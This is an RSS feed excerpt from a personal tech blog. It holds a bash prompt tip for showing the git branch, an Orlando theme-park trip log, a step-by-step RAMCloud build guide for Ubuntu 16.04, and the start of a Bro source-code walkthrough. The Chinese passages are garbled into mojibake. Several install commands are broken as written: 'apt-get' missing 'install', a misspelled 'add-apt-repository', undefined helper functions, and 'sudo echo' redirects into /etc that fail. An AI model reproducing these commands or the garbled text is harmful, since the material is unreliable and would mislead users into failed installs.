&lt;p>Open &lt;code>~/.bashrc&lt;/code> file, add the code followed this paragraph after the default prompt definition and &lt;code>unset color_prompt force_color_prompt&lt;/code>. You also can replace the the default prompt definition with the snippet or leave your &lt;code>~/.bashrc&lt;/code> as it is and comment the default prompt definition along with &lt;code>unset color_prompt force_color_prompt&lt;/code>.&lt;/p>
&lt;pre>&lt;code class="language-bash"># Add git branch if its present to PS1
parse_git_branch() {
git branch 2&amp;gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/(\1)/'
}
if [ &amp;quot;$color_prompt&amp;quot; = yes ]; then
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[01;31m\]$(parse_git_branch)\[\033[00m\]\$ '
else
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w$(parse_git_branch)\$ '
fi
&lt;/code>&lt;/pre>
&lt;p>replace&lt;/p>
&lt;pre>&lt;code class="language-bash">if [ &amp;quot;$color_prompt&amp;quot; = yes ]; then
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
&lt;/code>&lt;/pre>
&lt;p>Which ends with:&lt;/p>
&lt;pre>&lt;code class="language-bash">unset color_prompt force_color_prompt
&lt;/code>&lt;/pre></description></item><item><title>å¥¥å°å¤æè¡è®°å½[3æ¥]</title><link>http://www.guozet.me/post/Orlando-travel/</link><pubDate>Thu, 09 Aug 2018 13:42:10 +0000</pubDate><guid>http://www.guozet.me/post/Orlando-travel/</guid><description>&lt;p>è¿æ¬¡å¾æ©å°±è®¡åäºå«æä»½å°å¥¥å°å¤çæè¡ï¼æ­£å¥½è¿æ®µæ¶é´æå¨ææè¯¾ç¨åç§å­£è¯¾ç¨çä¸­é´ç©ºé²æ¶é´ï¼å¥¹ä¹ä½¿ç¨ä¸¤å¤©çåï¼è¿æ ·æä»¬å¯ä»¥å¨å¥¥å°å¤æå®æ´çä¸å¤©å¯ä»¥æ¸¸ç©äºã&lt;/p>
&lt;h1 id="è¡ç¨å®æ">è¡ç¨å®æ&lt;/h1>
&lt;p>æä»¬å¨å¥¥å°å¤çæ¸¸ç©æ¶é´åªæä¸å¤©ï¼ç¬¬ä¸å¤©æ¸¸ç©è¿ªæ¯å°¼&lt;code>Magic Kingdom Pack&lt;/code> ï¼åé¢ä¸¤å¤©æ¸¸ç©&lt;code>Universal Studios &amp;amp; Islands of Adventure &lt;/code>ã&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th align="left">æ¶é´&lt;/th>
&lt;th align="left">è¡ç¨&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td align="left">D1(23:30,08/10)&lt;/td>
&lt;td align="left">æµè¾¾å¥¥å°å¤æºåº(æä»Atlanta -&amp;gt; Orlando, å¥¹ä»Hartford-&amp;gt;Orlando))&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">D2(08/11)&lt;/td>
&lt;td align="left">è¿ªæ¯å°¼&lt;code>Magic Kingdom Pack&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">D3(08/12)&lt;/td>
&lt;td align="left">Universal Studios &amp;amp; Islands of Adventure&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">D4(08/13)&lt;/td>
&lt;td align="left">Universal Studios &amp;amp; Islands of Adventure&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">D5(07:30,08/14)&lt;/td>
&lt;td align="left">ç¦»å¼å¥¥å°å¤&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="æè¡åçåå¤">æè¡åçåå¤&lt;/h1>
&lt;h2 id="é¨ç¥¨è´­ä¹°">é¨ç¥¨è´­ä¹°&lt;/h2>
&lt;p>è¿ªæ¯å°¼çé¨ç¥¨å¨å®ç½è´­ä¹°å³å¯ï¼æä»¬éæ©çæ¯&lt;code>Magic kingdom pack&lt;/code>, éæ©è¿ä¸ªçåå ä¸»è¦æ¯å¥³æåæ¯è¾åæ¬¢ç±³å¥ï¼ç¶åæä»¬å¯¹å¤ªå°å­©å­çå­åºå¹¶ä¸æå´è¶£ãç¯çå½±åæä»¬éæ©äº&lt;code>Universal studios&lt;/code> å&lt;code>Islands of Adventure park&lt;/code>ç&lt;code>Two days 2-parks tickets&lt;/code>.å ä¸ºæä»¬å¾æ³å»ä½éªè½å¤è¿æ¥ä¸¤ä¸ªå²çå°ç«è½¦ã&lt;/p>
&lt;blockquote>
&lt;p>Tips: æä»¬ç&lt;code>universal studio ç Two days 2-pars ticket&lt;/code>æ¯å¨é£çªä¸å»è´­ä¹°çï¼æ¯å®ç½æ¯å¼ ç¥¨ä¾¿å®40åå·¦å³. å¦å¤è¿è¿ªæ¯å°¼çAPPé¢åä¸ä¸ªfast pass, è½å¤éæ©ä¸ä¸ªé¡¹ç®ï¼ç¶åæ éç­å¾å°±è½å¤ç©é¡¹ç®ï¼ä½¿ç¨å®ä¸ä¸ªFast passä¹åå¯ä»¥ç»§ç»­é¢åä¸ä¸ªfast passï¼ä½æ¯æå¤ä¸è½å¤è¶è¿4ä¸ª Fast Pass&lt;/p>
&lt;/blockquote>
&lt;h2 id="éåº">éåº&lt;/h2>
&lt;p>æä»¬å¨&lt;/p>
&lt;h2 id="å°å¾">å°å¾&lt;/h2>
&lt;p>
&lt;a href="http://www.wdwinfo.com/maps/MK.htm" target="_blank" rel="noopener">Magic Kingdom Maps&lt;/a>&lt;br>
&lt;a href="http://www.wdwinfo.com/maps/index.htm" target="_blank" rel="noopener">Disney Theme Park Maps&lt;/a>&lt;/p>
&lt;h1 id="è¿ªæ¯å°¼é­æ¯çå½disney-magic-kindomä¸å¤©è¡ç¨">è¿ªæ¯å°¼é­æ¯çå½(Disney Magic Kindom)ä¸å¤©è¡ç¨&lt;/h1>
&lt;h2 id="é¡¹ç®æ¸¸ç©å®æ">é¡¹ç®æ¸¸ç©å®æ&lt;/h2>
&lt;p>å¨è¿éè®°å½æä»¬äº²èªå»å°è¯è¿çé¡¹ç®
| é¡¹ç® | ä»ç» | æ¨èææ° |
| :&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash; | :&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;- | :&amp;mdash;&amp;mdash;- |
| Tomorrowland Speedway(Tomorrowland) | åºå®çå ä¸ªèµè½¦éï¼å¯ä»¥å¨éé¢å¼èµè½¦ï¼éåº¦å¹¶ä¸æ¯å¾å¿«ï¼ä½æ¯å¯ä»¥åé¢çè½¦æåé¢çè½¦ï¼è¿æ¯æ¯è¾ç½ç | 3+ |
| Space Mountain(Tomorrowland) | å®¤åè¿å±±è½¦ï¼æ¯è¾ç«çï¼æä»¬ä½¿ç¨äºFast Pass | 4+ |
| Buzz Lightyear&amp;rsquo;s Space Ranger Spin(Tomorrowland) | å·´æ¯åå¹´å°å»æ¸¸æ, æè§ä¸æ¯å¾å¥½ç© | 3 |
| Prince Charming Regal Carrousel(Tomorrowland) | æè½¬æ¨é©¬ | 2 |
| Space Mountain(Tomorrowland) | å®¤åè¿å±±è½¦ï¼æ¯è¾ç«çï¼æä»¬ä½¿ç¨äºFast Pass | 4+ |
| Buzz Lightyear&amp;rsquo;s Space Ranger Spin(Tomorrowland) | å·´æ¯åå¹´å°å»æ¸¸æ, æè§ä¸æ¯å¾å¥½ç© | 3 |&lt;/p>
&lt;p>æ¨è&lt;code>Buzz Lightyear's Space Ranger spin&lt;/code>,è¿æ¯ä¸ä¸ªå°å»ç±»æ¸¸æï¼ä½æ¯ä¸¤ä¸ªäººç©æ¯æ¯è¾æææç;å¦å¤&lt;code>Space Mountain&lt;/code>éå¸¸åºæ¿ï¼è½ç¶æ¯å®¤åè¿å±±è½¦ï¼ä½æ¯æè§å¾æ£ã&lt;/p>
&lt;h2 id="è¿ªæ¯å°¼æ¨èé¤å">è¿ªæ¯å°¼æ¨èé¤å&lt;/h2>
&lt;p>æ ¹æ®è¿ä¸¤å¤©å¨å¤åé¥­çä½ä¼ï¼è¿ªæ¯å°¼éé¢é¤åçæ´ä½ä»·æ ¼è¿ç®æ¯è¾æ­£å¸¸ï¼å¿«é¤çè¯äººåè±è´¹å¤§è´å¨15-25åä¸é¤ï¼ç±äºæä»¬æ²¡ææåé¢è®¢é¤åï¼æä»¥æä»¬åªè½å¨éé¢åå¿«é¤äºãé¤åæ¨èï¼&lt;/p>
&lt;h1 id="ç¯çå½±åday-1">ç¯çå½±å(Day 1)&lt;/h1>
&lt;h2 id="æ¸¸ç©é¡¹ç®æ¸å">æ¸¸ç©é¡¹ç®æ¸å&lt;/h2>
&lt;h3 id="universal-studio-florida">Universal Studio Florida&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th align="left">é¡¹ç®(ä½ç½®)&lt;/th>
&lt;th align="left">ä»ç»&lt;/th>
&lt;th align="left">æ¨èææ°&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td align="left">Despicable Me Minion(Production Central)&lt;/td>
&lt;td align="left">å°é»äººçµå½±ï¼æ¨èä¸æ©è¿å­å°±å»çï¼æéçäººæ¯è¾å°&lt;/td>
&lt;td align="left">5+&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Shrek 4-D&lt;/td>
&lt;td align="left">å²è±åç4Dçµå½±ï¼ä½æ¯æè§æ²¡æå°é»äººç²¾å½©&lt;/td>
&lt;td align="left">3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Hollywood rip ride Rocket&lt;/td>
&lt;td align="left">å¼ºçæ¨èï¼90åº¦ç´ä¸ï¼ç¶åè¿ç»­å ä¸ª360åº¦çæè½¬ï¼èä¸å¯ä»¥éæ©å¨è¿å±±è½¦ä¸é¢å¬çé³ä¹ï¼åè¿çæåºæ¿çè¿å±±è½¦&lt;/td>
&lt;td align="left">5+&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Transformers the Ride-3D&lt;/td>
&lt;td align="left">åå½¢éåç3Dï¼éå¸¸çç²¾å½©ï¼æè§æ¯å¨ååå½¢éåå±åææ&lt;/td>
&lt;td align="left">5+&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Revenge of the Mummy&lt;/td>
&lt;td align="left">å®¤åè¿å±±è½¦é¡¹ç®ï¼æ¨ä¹ä¼ä¸»é¢ï¼éå¸¸åºæ¿ï¼ææå¾èµ&lt;/td>
&lt;td align="left">5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Men in Black alien attack&lt;/td>
&lt;td align="left">æå¤æäººçå°å»ç±»æ¸¸æï¼ä¸ªäººæè§ä¸è¬ï¼åè¿ªæ¯å°¼çå·´æ¯åå¹´ç±»ä¼¼&lt;/td>
&lt;td align="left">3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">The Simpsons ride&lt;/td>
&lt;td align="left">è¾æ®æ£®çä¸å®¶ï¼å®¤å3D, ä½éªå¾ä¸é&lt;/td>
&lt;td align="left">5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">E.T advanture&lt;/td>
&lt;td align="left">èªè¡è½¦æ¨¡æ ·çæ¸¸è§è½¦ï¼æ²¡ææ&lt;/td>
&lt;td align="left">3&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="islands-of-adventure">Islands of Adventure&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th align="left">é¡¹ç®(ä½ç½®)&lt;/th>
&lt;th align="left">ä»ç»&lt;/th>
&lt;th align="left">æ¨èææ°&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td align="left">The incredible hunk Coaster(Super hero island)&lt;/td>
&lt;td align="left">ç»¿å·¨äººè¿å±±è½¦ï¼å¾åæ¬¢åå¼å§å éå²åºå»çæè§ï¼å¾åºæ¿&lt;/td>
&lt;td align="left">5+&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Stom Force acelatron&lt;/td>
&lt;td align="left">åå¨éé¢ï¼ä¸åè½¬å¨çåå½¢æºå¨ï¼å¤´æï¼æ è&lt;/td>
&lt;td align="left">2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">The amazing adventures of spider-man&lt;/td>
&lt;td align="left">3Dæ¨¡æææ¯ç±»ï¼è·çèèä¾ åç§ææªå½&lt;/td>
&lt;td align="left">5+&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Dudley do-right Ripsaw falls&lt;/td>
&lt;td align="left">æ¿æµåè¿ï¼æåä¸ä¸å¯è½ä¼æ¹¿è¡£æï¼ä½æ¯æ´ä½è¿è¡ï¼ä¸ç¨å­åï¼è¡£æä¸ä¼æ¹¿é&lt;/td>
&lt;td align="left">5+&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Harry potter and the Forbidden journey&lt;/td>
&lt;td align="left">è¶çº§ç«çï¼ä¸è½ä½¿ç¨express,æ¨èè¿å­å°±æ¥è¿éåç©è¿ä¸ª&lt;/td>
&lt;td align="left">5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Fight of the hippogriff&lt;/td>
&lt;td align="left">å°åè¿å±±è½¦ï¼åè¿ç»¿å·¨äººä¹åï¼å°±ä¼è§å¾è¿ä¸ªå¾æ èäº&lt;/td>
&lt;td align="left">3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td align="left">Doctor Doom&amp;rsquo;s fearfall(è·³æ¥¼æºï¼æ²¡æç©)&lt;/td>
&lt;td align="left">å¨å®¤å¤ï¼é«åº¦æç¹ææï¼æ²¡æç©&lt;/td>
&lt;td align="left">5+(åå®¢æ¨è)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></description></item><item><title>How to install RAMcloud on Ubuntu16.04</title><link>http://www.guozet.me/post/How-to-install-RAMcloud-on-Ubuntu16-04/</link><pubDate>Sun, 15 Jul 2018 11:38:13 +0000</pubDate><guid>http://www.guozet.me/post/How-to-install-RAMcloud-on-Ubuntu16-04/</guid><description>&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;p>
&lt;a href="https://github.com/PlatformLab/RAMCloud" target="_blank" rel="noopener">RAMCloud&lt;/a> is a new class of super-high-speed storage for large-scale datacenter applications. It is designed for applications in which a large number of servers in a datacenter need low-latency access to a large durable datastore. RAMCloud offers the following properties:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-47-41.png" alt="">&lt;/p>
&lt;p>Project Link:
&lt;a href="https://ramcloud.atlassian.net/wiki/spaces/RAM/overview" target="_blank" rel="noopener">RAMCloud&lt;/a>&lt;/p>
&lt;p>Office Installing introduce:
&lt;a href="https://ramcloud.atlassian.net/wiki/spaces/RAM/pages/6848614/General&amp;#43;Information&amp;#43;for&amp;#43;Developers" target="_blank" rel="noopener">General Information for Developers&lt;/a>&lt;/p>
&lt;p>I have written the shell script to install the RAMCloud on Ubuntu 16.04 or Ubuntu18.04. If you want to build the RAMCloud as soon as possible, please fell free to use my repo on the github. Please read the README.md file in the repo and know how to use the scripts to help you.&lt;/p>
&lt;ul>
&lt;li>Github repo Link:
&lt;a href="https://github.com/guozetang/RAMCloud_Ubuntu16.04" target="_blank" rel="noopener">RAMCloud For Ubuntu16.04&lt;/a>&lt;/li>
&lt;li>Bitbucket repo Link:
&lt;a href="https://bitbucket.org/guozetang/ramcloud/src/master/" target="_blank" rel="noopener">RAMCloud For Ubuntu16.04&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>If you have some issue with this script, please send
&lt;a href="guoze.work@gmail.com">email&lt;/a> to me. I will reply it as soon as possible. In addtion, please read the next introduce about how to install Ramcloud by command if you want to understand each step to install RAMCloud.&lt;/p>
&lt;hr>
&lt;h1 id="installing-ramcloud-on-ubuntu1604">Installing Ramcloud on Ubuntu16.04&lt;/h1>
&lt;h2 id="necessary-tools">Necessary Tools&lt;/h2>
&lt;ul>
&lt;li>GNU Make (Anything reasonably recent)&lt;/li>
&lt;li>GNU g++ (4.9.x)&lt;/li>
&lt;li>git (&amp;gt;= 1.6.0)&lt;/li>
&lt;li>Perl (Anything reasonably recent)
&lt;ul>
&lt;li>For mergedeps.pl, which automatically inserts included headers in source files into the make dependencies.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Python 2.6, epydoc&lt;/li>
&lt;li>Boost
&lt;ul>
&lt;li>If you&amp;rsquo;re having issues with Boost on Ubuntu, check boost ticket #3844.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>pcre&lt;/li>
&lt;li>Doxygen 1.7.1&lt;/li>
&lt;li>protocol buffers
&lt;ul>
&lt;li>If you&amp;rsquo;re getting lots of undefined reference errors during linking, it&amp;rsquo;s likely that your libprotobuf is compiled with a different library ABI than RAMCloud. Check GCC&amp;rsquo;s Dual ABI page and the &amp;ldquo;GLIBCXX_USE_CXX11_ABI&amp;rdquo; flag in GNUMakefile.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>ZooKeeper&lt;/li>
&lt;li>java and javac (&amp;gt;= 1.7.0_25)&lt;/li>
&lt;/ul>
&lt;p>If your system is Ubuntu 15.04 or 14.04, then you can just use this command to install these packets in your system.&lt;/p>
&lt;pre>&lt;code class="language-bash">apt-get install build-essential git-core doxygen=1.7.1 libpcre3-dev protobuf-compiler libprotobuf-dev libcrypto++-dev libevent-dev libboost-all-dev libgtest-dev libzookeeper-mt-dev zookeeper libssl-dev
&lt;/code>&lt;/pre>
&lt;h2 id="analyze">Analyze&lt;/h2>
&lt;p>I can&amp;rsquo;t use this command to work on the Ubuntu 16.04. In addtion, I hope I can use the RAMCloud on any Ubuntu system. It means that it should be worked on Ubuntu 16.04 or 18.04. So I need to compile these packet by g++ or gcc or Cmake.&lt;/p>
&lt;hr>
&lt;h2 id="install-dependency">Install Dependency&lt;/h2>
&lt;h3 id="install-build-essential-libssl-dev-and-git">Install build-essential, libssl-dev and git&lt;/h3>
&lt;p>We can get these two libs on Ubuntu 16.06 or 18.04. So we just need to use &lt;code>apt-get&lt;/code> to get these lib.&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get -y build-essential libssl-dev git
&lt;/code>&lt;/pre>
&lt;h3 id="install-gccg-49">Install gcc/g++ 4.9&lt;/h3>
&lt;p>The RAMCloud source code used some features in the C++11 Standard. As a result, we need to make sure the &lt;code>gcc/g++&lt;/code> version have support the &lt;code>C++11&lt;/code> Standard. Then we choose the &lt;code>gcc/g++ 4.9&lt;/code> to install. Please follow the commands.&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get install -y software-properties-common
sudo add-apt-repositocry -y ppa:ubuntu-toolchain-r/test
sudo apt-get update
mv /usr/bin/gcc /usr/bin/gcc.bak
mv /usr/bin/g++ /usr/bin/g++.bak
sudo apt-get install -y gcc-4.9
sudo apt-get install -y g++-4.9
lnif /usr/bin/g++-4.9 /usr/bin/g++
lnif /usr/bin/gcc-4.9 /usr/bin/gcc
g++ -v
gcc -v
&lt;/code>&lt;/pre>
&lt;p>If the &lt;code>g++ -v&lt;/code> command can output the information like the followed graph. Then it means that you have installed the &lt;code>g++ 4.9&lt;/code> correctly.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-35-42.png" alt="">&lt;/p>
&lt;p>If the &lt;code>gcc -v&lt;/code> command can output the information like the followed graph. Then it means that you have installed the &lt;code>gcc 4.9&lt;/code> correctly.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-37-27.png" alt="">&lt;/p>
&lt;p>You must to make sure you have installed the &lt;code>gcc&lt;/code> and &lt;code>g++&lt;/code> correctly when you want to continue the next steps.&lt;/p>
&lt;h3 id="install-java-and-javac">Install Java and Javac&lt;/h3>
&lt;pre>&lt;code class="language-bash">sudo apt-add-repository -y ppa:webupd8team/java
sudo apt-get update
install_dependency oracle-java8-installer
java -version
&lt;/code>&lt;/pre>
&lt;p>If the &lt;code>java -version&lt;/code> command can output the information like the followed graph. Then it means that you have installed the &lt;code>java&lt;/code> correctly.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-40-29.png" alt="">&lt;/p>
&lt;h3 id="install-cmake">Install Cmake&lt;/h3>
&lt;p>We will use &lt;code>Cmake&lt;/code> to compile the &lt;code>Doxygen 1.7.2&lt;/code> in the next steps.&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get install -y software-properties-common
sudo add-apt-repository -y ppa:george-edison55/cmake-3.x
sudo apt-get update
sudo apt-get install -y cmake
cmake --version
&lt;/code>&lt;/pre>
&lt;p>Use &lt;code>cmake --version&lt;/code> to check the version of cmake. If the &lt;code>cmake --version&lt;/code> command can output the informaton like the followed graph. Then it means that you have installed the &lt;code>cmake&lt;/code> correctly.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-49-08.png" alt="">&lt;/p>
&lt;hr>
&lt;h3 id="download-the-packages-which-will-be-need-in-the-next-few-steps">Download the packages which will be need in the next few steps.&lt;/h3>
&lt;pre>&lt;code class="language-bash">git clone git@bitbucket.org:guozetang/ramcloud.git
cd ./ramcloud/packages/
&lt;/code>&lt;/pre>
&lt;p>When you get in to this director, you can find these packages in this director.
&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-20-16-41.png" alt="">&lt;/p>
&lt;p>We will use these packages in the next steps.&lt;/p>
&lt;h3 id="install-pcre">Install Pcre&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xzvf pcre-8.42.tar.gz
cd pcre-8.42
./configure --prefix=/usr/local/pcre
make
sudo make install
sudo echo &amp;quot;/usr/local/pcre/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/pcre.conf
&lt;/code>&lt;/pre>
&lt;h3 id="install-python26">Install Python2.6&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar zxvf Python-2.6.6.tgz
cd Python-2.6.6
./configure --prefix=/usr/local/python2.6
make
sudo make install
sudo ln -s /usr/local/python2.6/bin/python2.6 /usr/bin/python2.6 -f
config_ld_lib /usr/local/python2.6/lib/ /etc/ld.so.conf.d/python2.6.conf
python2.6 --version
&lt;/code>&lt;/pre>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-17-08-22.png" alt="">&lt;/p>
&lt;h3 id="install-boost">Install Boost&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xvf boost_1_52_0.tar
cd boost_1_52_0
sudo ./bootstrap.sh
sudo ./b2 -j
sudo ./b2 install --prefix=/usr/local/boost_1_52_0
sudo echo &amp;quot;/usr/local/boost_1_52_0/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/boost_1_52_0.conf
&lt;/code>&lt;/pre>
&lt;h3 id="install-doxygen172">Install Doxygen1.7.2&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xzvf doxygen.tar.gz
cd doxygen
cd build
cmake -G &amp;quot;Unix Makefiles&amp;quot; ..
make
sudo make Install
&lt;/code>&lt;/pre>
&lt;h3 id="install-protocol-buffers">Install Protocol Buffers&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xzvf protobuf-2.6.1.tar.gz
cd $CURRENT_DIR/packages/protobuf-2.6.1
./configure --prefix=/usr/local/protobuf
make
make check
sudo make install
sudo echo &amp;quot;/usr/local/protobuf/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/protobuf.conf
sudo ln -s /usr/local/protobuf/bin/protoc /usr/bin/protoc -f
&lt;/code>&lt;/pre>
&lt;h3 id="install-zookeeper">Install Zookeeper&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xzvf zookeeper-3.3.6.tar.gz
cd zookeeper-3.3.6/src/c
./configure --prefix=/usr/local/zookeeper
make
sudo make install
sudo echo &amp;quot;/usr/local/zookeeper/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/zookeeper.conf
&lt;/code>&lt;/pre>
&lt;p>This last command &lt;code>sudo echo &amp;quot;/usr/local/zookeeper/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/zookeeper.conf&lt;/code> can make the other application can find the &lt;code>zookeeper lib&lt;/code> in the system.&lt;/p>
&lt;h2 id="config-the-path">Config the Path&lt;/h2>
&lt;p>Add the &lt;code>include path&lt;/code>,&lt;code>library path&lt;/code> in the &lt;code>/etc/profile&lt;/code>.&lt;/p>
&lt;pre>&lt;code class="language-bash">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/pcre/lib/:/usr/local/python2.6/lib/:/usr/local/boost_1_52_0/lib/:/usr/local/protobuf/lib/:/usr/local/zookeeper/lib/
export LIBRARY_PATH=$LIBRARY_PATH:/usr/local/pcre/lib/:/usr/local/python2.6/lib/:/usr/local/boost_1_52_0/lib/:/usr/local/protobuf/lib/:/usr/local/zookeeper/lib/
export C_INCLUDE_PATH=$C_INCLUDE_PATH:/usr/local/pcre/include/:/usr/local/python2.6/include/:/usr/local/boost_1_52_0/include/:/usr/local/protobuf/include/:/usr/local/zookeeper/include/c-client-src/
export CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/usr/local/pcre/include/:/usr/local/python2.6/include/:/usr/local/boost_1_52_0/include/:/usr/local/protobuf/include/:/usr/local/zookeeper/include/c-client-src/
export PATH=$PATH:/usr/local/pcre/bin/:/usr/local/python2.6/bin/:/usr/local/protobuf/bin/:/usr/local/zookeeper/bin/
export PKG_CONFIG_PATH=:/usr/local/protobuf/lib/pkgconfig/
&lt;/code>&lt;/pre>
&lt;h2 id="install-ramcloud">Install RAMCloud&lt;/h2>
&lt;pre>&lt;code class="language-bash">git clone https://github.com/PlatformLab/RAMCloud.git
cd RAMCloud
make -j12 DEBUG=no
&lt;/code>&lt;/pre></description></item><item><title>Broæºä»£ç åæ---IPæ°æ®åå¤çæµç¨</title><link>http://www.guozet.me/post/Bro-source-codes-walkthought/</link><pubDate>Sat, 09 Jun 2018 01:02:39 +0000</pubDate><guid>http://www.guozet.me/post/Bro-source-codes-walkthought/</guid><description>&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>Broæ¯ä¸æ¬¾éå¸¸ä¼ç§çç½ç»åè®®åæå¨ãBroéé¢çBinpacè§£æå¨å¯ä»¥å¾æ¹ä¾¿çè®©æä»¬ä½¿ç¨Binpacè¯­è¨ä¹¦ååè®®è§£æå¨ï¼å¹¶éè¿Binpacè½¬æ¢æC++è¯­è¨ï¼è¿å¨ä½¿ç¨ä¸­è½å¤å¾å¤§ç¨åº¦çåå°å¼åæ¶é´ï¼ä¹å¯ä»¥é¿åæåå®¹æèèä¸å¨çé®é¢ãä½æ¯å¨ä½¿ç¨Binpacä¹åï¼æä»¬éè¦å»äºè§£Broå¨å¤çç½ç»æ°æ®åçæ¶åçå¤çæµç¨ï¼è½å¤æ¹ä¾¿æä»¬å¨Binpacä½¿ç¨ä¸­å»æåBroè¦åçé¨åï¼çææä»¬éè¦çåè®®è§£æå¨çC++æä»¶ã&lt;/p>
&lt;h1 id="æºä»£ç éè¯»">æºä»£ç éè¯»&lt;/h1>
&lt;blockquote>
&lt;p>éç¹ï¼å³æ³¨äºç½ç»æ°æ®åçå¤çé¨åä»£ç &lt;/p>
&lt;/blockquote>
&lt;h2 id="broçç½ç»æ°æ®åå¤çæµç¨">Broçç½ç»æ°æ®åå¤çæµç¨&lt;/h2>
&lt;h3 id="broå¯å¨åå§åå½æ°maincc">Broå¯å¨åå§åå½æ°main.cc&lt;/h3>
&lt;blockquote>
&lt;p>int main(int argc, char** argv) (main.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09Bro-Main.png" alt="2018-06-09Bro-Main">&lt;/p>
&lt;p>å¨Broç&lt;code>main.cc&lt;/code>æä»¶éé¢çMainå½æ°æ¯Broå¯å¨è¿ç¨ä¸­çé¦åæ§è¡çå½æ°ï¼èå¨è¿ä¸ª&lt;code>main&lt;/code>å½æ°éé¢ï¼åæä»¬çæ°æ®åå¤çé¨åç¸å³å¯åçå½æ°æ¯&lt;code>net_run()&lt;/code>å½æ°ï¼è¿ä¸ªå½æ°æ¯ä¸ä¸ªä¸ç´å¾ªç¯çå½æ°ï¼ä¸æ¦åºæ¥è¿ä¸ªå½æ°ä¹åï¼åé¢å·®ä¸å¤å°±ç»æäºãæ¥ä¸æ¥éè¯»è¯¥å½æ°ä»£ç ã&lt;/p>
